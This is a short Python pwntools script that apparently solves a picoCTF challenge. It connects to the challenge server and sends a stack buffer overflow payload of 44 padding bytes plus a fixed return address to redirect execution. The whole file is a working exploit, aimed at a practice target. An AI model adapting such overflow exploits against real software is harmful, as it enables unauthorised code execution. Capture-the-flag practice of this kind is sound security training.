from pwn import *

# p = process('./vuln')
host = 'saturn.picoctf.net'
port = 55096
p = remote(host, port)

offset = 44
ret_addr = 0x080491f6

payload = b"A" * offset + p32(ret_addr)
p.sendline(payload)
p.interactive()
